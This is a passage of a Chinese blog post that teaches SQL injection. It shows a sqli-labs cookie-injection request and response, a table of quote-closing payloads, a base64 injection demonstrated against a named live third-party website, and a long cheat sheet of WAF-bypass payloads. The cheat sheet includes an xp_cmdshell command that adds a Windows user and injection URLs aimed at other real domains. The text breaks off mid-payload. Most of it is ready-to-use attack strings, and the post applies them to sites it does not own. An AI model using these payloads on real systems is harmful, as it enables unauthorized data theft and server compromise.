type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Delete Your Cookie!&quot; /&gt;&apos;;</span><br><span class="line">echo &apos;&lt;/form&gt;&apos;;</span><br><span class="line">echo &apos;&lt;/center&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo &apos;&lt;center&gt;&apos;;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo &apos;&lt;font color= &quot;#FFFF00&quot; font size = 6 &gt;&apos;;</span><br><span class="line">echo &quot; Your Cookie is deleted&quot;;</span><br><span class="line">setcookie(&apos;uname&apos;, $row1[&apos;username&apos;], time()-3600);</span><br><span class="line">header (&apos;Location: index.php&apos;);</span><br><span class="line">echo &apos;&lt;/font&gt;&lt;/center&gt;&lt;/br&gt;&apos;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">//header (&apos;Location: main.php&apos;);</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">//echo &apos;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&lt;/center&gt;&apos;;</span><br><span class="line">//logging the connection parameters to a file for analysis.</span><br><span class="line">$fp=fopen(&apos;result.txt&apos;,&apos;a&apos;);</span><br><span class="line">fwrite($fp,&apos;Cookie:&apos;.$cookee.&quot;\n&quot;);</span><br><span class="line"></span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">对username和password进行了严格的过滤和去除了反斜杆几乎不存在注入</span><br><span class="line">但是带入cookie进行查询的时候没有做好对应的过滤措施，导致SQL注入的发送</span><br><span class="line"></span><br><span class="line">POST /Less-20/index.php HTTP/1.1</span><br><span class="line">Host: 118.24.125.87:8000</span><br><span class="line">Content-Length: 0</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://118.24.125.87:8000</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Referer: http://118.24.125.87:8000/Less-20/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8</span><br><span class="line">Cookie:  uname=admin&apos; and updatexml(1,concat(0x7e,(select user()),0x7e),1) and &apos;1&apos;=&apos;1</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">返回：</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Thu, 17 Jan 2019 05:37:48 GMT</span><br><span class="line">Server: Apache/2.4.7 (Ubuntu)</span><br><span class="line">X-Powered-By: PHP/5.5.9-1ubuntu4.13</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Content-Length: 1028</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;</span><br><span class="line">&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;title&gt;Less-20 Cookie Injection- Error Based- string&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body bgcolor=&quot;#000000&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">&lt;center&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;img src=&quot;../images/Less-20.jpg&quot; /&gt;&lt;br&gt;&lt;br&gt;&lt;b&gt;&lt;br&gt;&lt;font color= &quot;red&quot; font size=&quot;4&quot;&gt;YOUR USER AGENT IS : Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0&lt;/font&gt;&lt;br&gt;&lt;font color= &quot;cyan&quot; font size=&quot;4&quot;&gt;YOUR IP ADDRESS IS : 113.77.238.53&lt;/font&gt;&lt;br&gt;&lt;font color= &quot;#FFFF00&quot; font size = 4 &gt;DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE &lt;br&gt;&lt;font color= &quot;orange&quot; font size = 5 &gt;YOUR COOKIE : uname = admin&apos; and updatexml(1,concat(0x7e,(select user()),0x7e),1) and &apos;1&apos;=&apos;1 and expires: Thu 17 Jan 2019 - 06:37:48&lt;br&gt;&lt;/font&gt;Issue with your mysql: XPATH syntax error: &apos;~root@localhost~&apos;</span><br></pre></td></tr></table></figure></p><p>Referer和headers头部注入也是类似于cookie注入的原因而导致的注入，这里就略过不说了</p><p>闭合注入<br>如果注入点类似于在<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where username=&apos;username&apos;</span><br></pre></td></tr></table></figure></p><p>那么就要对注入语句进行闭合<br>常见的闭合<br>注意<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里的%7c为|</span><br></pre></td></tr></table></figure></p><table><thead><tr><th>SQL查询语句</th><th>闭合注入语句</th></tr></thead><tbody><tr><td>select * from users where username=’$u’;</td><td>‘ and 1=2 # 或 ‘ and 1=2 and ‘1’=’1 或 and 1=2 %7c’1</td></tr><tr><td>select * from users where usersname=”$U”;</td><td>“and 1=2 –+ 或 “ and 1=2 and “1”=”1 或 and 1=2 %7c”1</td></tr><tr><td>select * from users where username=(“$u”);</td><td>“) and 1=2 –+ 或 “) and 1=2 and (“1”)=(“1 或 and 1=2 %7c(“1</td></tr></tbody></table><p>base64注入</p><p>将变量进行了base64编码，到后端处理代码在进行base64解码然后在带入数据库中查询</p><p>实例：</p><p><a href="http://www.ccctawau.org/eventinfo.php?id=MTM=" target="_blank" rel="noopener">斗湖中华商会</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">仅供测试使用，若是想蹲监与作者无关</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/01/31/k1akSs.md.png" alt="k1akSs.md.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.ccctawau.org/eventinfo.php?id=MTM=</span><br></pre></td></tr></table></figure><p>明显的base64加密，解密看看？<br><img src="https://s2.ax1x.com/2019/01/31/k1amwT.png" alt="k1amwT.png"></p><p>尝试注入<br><img src="https://s2.ax1x.com/2019/01/31/k1aMY4.png" alt="k1aMY4.png"></p><p>and 1=2返回了错误<br><img src="https://s2.ax1x.com/2019/01/31/k1a1p9.md.png" alt="k1a1p9.md.png"></p><p>and 1=1返回了正常<br><img src="https://s2.ax1x.com/2019/01/31/k1a3lR.png" alt="k1a3lR.png"></p><p>注入带走<br><img src="https://s2.ax1x.com/2019/01/31/k1awfH.md.png" alt="k1awfH.md.png"></p><h4 id="绕过过滤注入"><a href="#绕过过滤注入" class="headerlink" title="绕过过滤注入"></a>绕过过滤注入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.先判断他过滤了什么</span><br><span class="line">2.能否通过切割关键字绕过</span><br><span class="line">3.能否通过代替关键字绕过</span><br></pre></td></tr></table></figure><p>注入常遇见的WAF：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">WTS-WAF</span><br><span class="line">安全狗</span><br><span class="line">D盾</span><br><span class="line">云锁</span><br></pre></td></tr></table></figure></p><p>前两种比较好绕过，后面两种本人没成功过= =</p><p>常见的绕过语句：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br></pre></td><td class="code"><pre><span class="line">对参数名进行url编码</span><br><span class="line">http://127.0.0.1/sql.php?%69d=1</span><br><span class="line">对参数值进行url编码</span><br><span class="line">http://127.0.0.1/sql.php?id=1%20%61%6E%64%20%31%3D%32</span><br><span class="line">对参数值进行双重编码</span><br><span class="line">http://127.0.0.1/sql.php?id=1%25%32%30%25%36%31%25%36%45%25%36%34%25%32%30%25%33%31%25%33%44%25%33%32</span><br><span class="line">单引号的一些编码：</span><br><span class="line">%u0027</span><br><span class="line">%u02b9</span><br><span class="line">%u02bc</span><br><span class="line">%u02c8</span><br><span class="line">%u2032</span><br><span class="line">%uff07</span><br><span class="line">%c0%27</span><br><span class="line">%c0%a7</span><br><span class="line">%e0%80%a7</span><br><span class="line">星号的一些编码：</span><br><span class="line">%u002a</span><br><span class="line">%uff0a</span><br><span class="line">%c0%2a</span><br><span class="line">%c0%aa</span><br><span class="line">%e0%80%aa</span><br><span class="line">使用 Mysql 内置函数 char（）。示例代码:</span><br><span class="line">char(114)=&apos;r&apos;</span><br><span class="line">1.3 使用 Mysql 内置函数 HEX（）,UNHEX(). ,UNHEX(). ,UNHEX(). ,UNHEX().示例代码：</span><br><span class="line">通过 str 获取 hex 值:</span><br><span class="line">select hex(&quot;root&quot;) 返回结果:726F6F74</span><br><span class="line">通过 hex 获取 str:</span><br><span class="line">select unhex( &quot;726F6F74&quot; ) 返回结果: root</span><br><span class="line">比如:当关键字 root 被过滤时可以用 0x726F6F74 代替 root</span><br><span class="line">base64变形注入，通过base64编码引发的注入</span><br><span class="line">http://127.0.0.1/sql.php?id=1</span><br><span class="line">http://127.0.0.1/sql.php?id=MSBhbmQgMT0y</span><br><span class="line">判断注入点的姿势</span><br><span class="line">id=1+OR+0x50=0x50</span><br><span class="line">id=1+and+5!=6</span><br><span class="line">And 0 (false)</span><br><span class="line">And 1 (true)</span><br><span class="line">And (true)</span><br><span class="line">And (false)</span><br><span class="line">&apos;/*!or*/1=&apos;1</span><br><span class="line">or 1=1;%00</span><br><span class="line">and 1=1</span><br><span class="line">&amp;&amp;2=2</span><br><span class="line">or 3=3</span><br><span class="line">Xor 4=4</span><br><span class="line">Xor 5 LIKE 5</span><br><span class="line">or 6 rLiKE 6</span><br><span class="line">|| 3&gt;2</span><br><span class="line">&amp;&amp; 3&lt;7</span><br><span class="line">AnD is null</span><br><span class="line">AnD is not null</span><br><span class="line">and &apos;0having&apos;=&apos;0having&apos;</span><br><span class="line">and 1=&apos;1</span><br><span class="line"></span><br><span class="line">替换空格</span><br><span class="line">/**/</span><br><span class="line">+</span><br><span class="line">%20</span><br><span class="line">&apos;%01&apos;, &apos;%02&apos;, &apos;%03&apos;, &apos;%04&apos;, &apos;%05&apos;, &apos;%06&apos;, &apos;%07&apos;, &apos;%08&apos;, &apos;%09&apos;, &apos;%0B&apos;, &apos;%0C&apos;, &apos;%0D&apos;, &apos;%0E&apos;, &apos;%0F&apos;,</span><br><span class="line">&apos;%0A&apos;</span><br><span class="line">--%0A</span><br><span class="line">%23%0A</span><br><span class="line">%23PTTmJopxdWJ%0A</span><br><span class="line">%23cWfcVRPV%0A</span><br><span class="line">‘or+(1)sounds/**/like“1“–%a0-</span><br><span class="line">‘union(select(1),tabe_name,(3)from`information_schema`.`tables`)#</span><br><span class="line">(0)union(select(table_name),column_name,…</span><br><span class="line">0%a0union%a0select%09group_concat(table_name)….</span><br><span class="line">?id=(case(substr((select(group_concat(table_name))from(information_schema.tables)),1,1))when(</span><br><span class="line">0x61)then(1)else(2)end)</span><br><span class="line">?id=(0)union(select(table_name),column_name,(0)from(information_schema.columns)having((tab</span><br><span class="line">le_name)like(0x7573657273)))#</span><br><span class="line">?id=if((select(count(*))from(information_schema.columns))=187,1,2)</span><br><span class="line">用过多个空格替换&quot; &quot;=&gt;&quot; &quot;</span><br><span class="line">用%bf%27 代替单引号</span><br><span class="line">PostgreSQL 可以用$$代替单引号来突破防注入</span><br><span class="line">可以达到相似目的的 Mysql 函数</span><br><span class="line">substring() mid() substr()</span><br><span class="line">ascii() hex() bin() ord()</span><br><span class="line">benchmark() sleep()</span><br><span class="line"></span><br><span class="line">没有where如何注入：</span><br><span class="line">源语句：select user from users where user=&quot;admin&quot;;</span><br><span class="line">没有where语句：select user from users group by user having user=&quot;admin&quot;;</span><br><span class="line">没有union：</span><br><span class="line">and (select passfrom userslimit 1)=’secret</span><br><span class="line">And exists (select * fromuser limit 1)=’admin</span><br><span class="line">没有limit</span><br><span class="line"> select pass from users where 1</span><br><span class="line"> 没有group</span><br><span class="line"> select substr(user,1) from users //直接爆出全部内容</span><br><span class="line"> select substr(user,1,1) from users //爆出全部的第一个字符 第二个1可以改为你要爆出的字符长度</span><br><span class="line"> select substr(user,1,20) from users</span><br><span class="line"> 没有having</span><br><span class="line"> select group_concat(user) from users</span><br><span class="line"> select max(user) from users</span><br><span class="line"> select max(replace(user,&apos;第一个获取到的内容&apos;,&apos;&apos;)) from users; //这个依次替换文字的地方就能获取所有内容</span><br><span class="line"> 没有 select</span><br><span class="line">‘ and</span><br><span class="line">substr(load_file(‘file’),locate(‘DocumentRoot’,(load_file(‘file’)))+length(‘DocumentRoot’),10)</span><br><span class="line">=’a</span><br><span class="line">‘=” into outfile ‘/var/www/dump.txt</span><br><span class="line"></span><br><span class="line"> 没有and</span><br><span class="line"> http://www.ryowa-ceramic.com/company.php?id=if(1=1,(1=1),1) //返回正常</span><br><span class="line"> http://www.ryowa-ceramic.com/company.php?id=if(1=1,(1=2),1)  //返回错误</span><br><span class="line"> 没有 or</span><br><span class="line">1 || substr(user,1,1) = &apos;a&apos;</span><br><span class="line">1 || substr(user,1,1) = unhex(61)</span><br><span class="line">1 || substr(user,1,1) = lower(conv(11,10,36))</span><br><span class="line">1 || lpad(user,7,1)</span><br><span class="line">1%0b||%0blpad(user,7,1)</span><br><span class="line">突破 preg_replace preg_replace preg_replace preg_replace</span><br><span class="line">http://localhost/sqli.php?id=1+UNunionION+SEselectLECT+1,2,3--</span><br><span class="line"> 多参数处理规则：</span><br><span class="line">  web 服务器 | 参数的处理方式 | 例子 |</span><br><span class="line">+--------------------------------------------------------------------------------+</span><br><span class="line">| ASP.NET/IIS | 用逗号隔开 | par1=val1,val2 |</span><br><span class="line">| ASP/IIS | 用逗号隔开 | par1=val1,val2 |</span><br><span class="line">| PHP/Apache | 取最后一个参数的值 | par1=val2 |</span><br><span class="line">| JSP/Tomcat | 取第一个参数的值 | par1=val1 |</span><br><span class="line">| Perl/Apache | 取第一个参数的值 | par1=val1</span><br><span class="line"></span><br><span class="line">打碎关键字</span><br><span class="line">使用%打碎关键字</span><br><span class="line"> http://127.0.0.1/sql.php?id=1 u%onion s%e%l%e%c%t 1,2,3</span><br><span class="line"> 通过注释符号打碎关键字（不适用于MYSQL&gt;4.1的情况）</span><br><span class="line"> http://127.0.0.1/sql.php?id=1 un/**/ion se/**/lect 1,2,3</span><br><span class="line"> 使用%0b打碎关键字</span><br><span class="line"> http://127.0.0.1/sql.php?id=1 un%0bion se%0blect 1,2,3</span><br><span class="line"> 使用%0f打碎关键字</span><br><span class="line"> http://127.0.0.1/sql.php?id=1 uni%6fn</span><br><span class="line"> </span><br><span class="line"> 更改请求方式</span><br><span class="line"> </span><br><span class="line">cookie注入</span><br><span class="line">示例代码：javascript:alert(documnet.cookie=&quot;id&quot;+escpace(&quot;51 and 1=1&quot;));</span><br><span class="line">更改method为post</span><br><span class="line"></span><br><span class="line">web服务器和WAF对一些字符的处理</span><br><span class="line">+-----------------------------------------------------------+</span><br><span class="line">| | Apache/2.2.16, PHP/5.3.3 | IIS6/ASP |</span><br><span class="line">+-----------------------------------------------------------+</span><br><span class="line">| ?test[1=2 | test_1=2 | test[1=2 |</span><br><span class="line">| ?test=% | test=% | test= |</span><br><span class="line">| ?test%00=1 | test=1 | test=1 |</span><br><span class="line">| ?test=1%001 | NULL | test=1 |</span><br><span class="line">| ?test+d=1+2 | test_d=1 2 | test d=1 2 |</span><br><span class="line">+----------------------------------------------------------------------+</span><br><span class="line">+-------------------------------------------------------------------- --------+</span><br><span class="line">| Keywords | WAF | ASP/ASP.NET |</span><br><span class="line">+-----------------------------------------------------------------------------+</span><br><span class="line">| sele%ct * fr%om.. | sele%ct * fr%om.. | select * from.. |</span><br><span class="line">| ;dr%op ta%ble xxx | ;dr%op ta%ble xxx | ;drop table xxx |</span><br><span class="line">| &lt;scr%ipt&gt; | &lt;scr%ipt&gt; | &lt;script&gt; |</span><br><span class="line">| &lt;if%rame&gt; | &lt;if%rame&gt; | &lt;iframe&gt; |</span><br><span class="line">+-----------------------------------------------------------------------------+</span><br><span class="line"></span><br><span class="line">突破安全狗</span><br><span class="line">安全狗本 身对 xx.asp?id=69 and 1=1 和 xx.asp?id=69 and 1=2 这些是过 滤的，可是对</span><br><span class="line">xx.asp?sqli.com=%00.&amp;xw_id=69%20 and 1=1 和 xx.asp?sqli.com=%00.&amp;xw_id=69%20 and</span><br><span class="line">1=2 却是正常，直接丢到工具就 OK 了</span><br><span class="line"></span><br><span class="line">缓冲区溢出</span><br><span class="line">突破用 C 语言编写的 WAF</span><br><span class="line">示例代码：</span><br><span class="line">http://localhost/sqli.php?id=1+and+(select 1)=(select</span><br><span class="line">0x414141414141441414141414114141414141414141414141414141</span><br><span class="line">414141414141?.)+union+select+1,2,version(),database(),user(),6,7,8,9,10--</span><br><span class="line"></span><br><span class="line">组合攻击</span><br><span class="line">asp 和 asp.net 的 Request 对象存在一个包解析漏洞，Request 对象对于 GET 和 POST 包的解</span><br><span class="line">析过于宽松，用一句话表达就是 Request 对象它 GET 和 POST 傻傻分不清楚，稍有点 web</span><br><span class="line">开发经验的同学应该知道 Request 接收 GET,POST,COOKIE 也就是 GPC 传过来的数据，但</span><br><span class="line">是 asp 和.net 库内置的 Request 对象完全不按 RFC 标准来，下面我们可以做个测试：</span><br><span class="line">我们发送的原始包是：</span><br><span class="line">GET /1.asp HTTP/1.1</span><br><span class="line">Host: 192.168.239.129</span><br><span class="line">Content-Length: 34</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">t=’/**/or/**/1=1–</span><br><span class="line">结果返回如下：</span><br><span class="line">Request:’/**/or/**/1=1–</span><br><span class="line">将 python 测试脚本的 path 改为/1.aspx 测试页返回同样结果。</span><br><span class="line">我们可以看到这是一个畸形的 HTTP GET 请求包，这个包的奥秘在于 t=’/**/or/**/1=1–参数后的 8 个回车换行和 Content-Length 头，包的结构类似于一个 POST 包，而请求的方法是</span><br><span class="line">GET,最后 asp 和 asp.net 的 Request 对象成功的解析了这个畸形包取出了数据。</span><br><span class="line">所以如果 WAF 没有处理好 HTTP 包的内容，沿用常规思路处理 GET 和 POST 的逻辑的话，</span><br><span class="line">那么这个畸形包将会毁掉 WAF 的基础防御。</span><br><span class="line"></span><br><span class="line">关键字的大小写转换</span><br><span class="line">SelECt</span><br><span class="line">UnIoN</span><br><span class="line">FroM</span><br><span class="line">UnioN AIL</span><br><span class="line">GrOuP_ConCAt()</span><br><span class="line"></span><br><span class="line">/**/为注释</span><br><span class="line">/*!*/执行/*!*/里面的内容</span><br><span class="line"></span><br><span class="line">（遇狗可借鉴下面的操作）</span><br><span class="line">对参数值进行污染处理</span><br><span class="line">localhost/sqli.php?id=123 uNiOn All sEleCt/*We are bypassing the WAF*/select/*Rafay Hacking</span><br><span class="line">Artcles*/1,2,3,4,5--</span><br><span class="line">0/**/union/*!50000select*/table_name`foo`/**/…</span><br><span class="line">http://localhost/sqli.aspx?q=select/*&amp;q=*/name&amp;q=password/*&amp;q=*/from/*&amp;q=*/users</span><br><span class="line">http://localhost/sqli.aspx?id=1&apos;; /*&amp;id=1*/ EXEC /*&amp;id=1*/ master..xp_cmdshell</span><br><span class="line">/*&amp;id=1*/ ?net user lucifer UrWaFisShiT? /*&amp;id=1*/ --</span><br><span class="line">/?id=1/*union*/union/*select*/select+1,2,3/*</span><br><span class="line">id=1+union/*&amp;name=*/select+1,2 （存在参数 name）</span><br><span class="line">http://www.f4le.com/member/ajax_membergroup.php?[url=mailto:00.&amp;action=post&amp;membergrou</span><br><span class="line">p=@%60]action=post&amp;membergroup=@`&apos;[/url]` Union select pwd from `%23@__admin` where</span><br><span class="line">1 or id=@`&apos;`</span><br><span class="line">http://www.f4le.com/member/ajax_membergroup.php?0dayf4le.com=%[url=mailto:00.&amp;action=p</span><br><span class="line">ost&amp;membergroup=@`]00.&amp;action=post&amp;membergroup=@`&apos;[/url]` Union select pwd from</span><br><span class="line">`%23@__admin` where 1 or id=@`&apos;`</span><br><span class="line"></span><br><span class="line">group_concat()的 1024 chars 的解决方案</span><br><span class="line">select group_concat(substr(user,1,1)) from users; //取从第一个字符到第一个字符</span><br><span class="line">select group_concat(substr(user,1,5)) from users; //取从第一个字符到第五个字符</span><br><span class="line">查询语句写到注释当中</span><br><span class="line">http://127.0.0.1/sql.php? /*!union*/**/*!select 1,user(),database()*/</span><br><span class="line">http://127.0.0.1/sql.php?/*dsadsasdd*/*!and*/*The is by pass*/*!1=2*/</span><br><span class="line">注释符</span><br><span class="line">%23 （#的url编码）[建议养成使用%23的习惯]</span><br><span class="line">-- (后面有个空格所有建议直接使用--+)</span><br><span class="line">/**/</span><br><span class="line">%00(在MS access当中可以当注释符号来用)</span><br><span class="line"></span><br><span class="line">突破防注入代码小抄</span><br><span class="line">%00&apos; UNION SELECT password FROM Users WHERE username=&apos;admin&apos;--+</span><br><span class="line">IFNULL(1, 2) 可以改写成 IF(ISNULL(1), 2, 1)</span><br><span class="line">0′union all select all`table_name`foo from`information_schema`. `tables</span><br><span class="line">value&apos;/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNUL</span><br><span 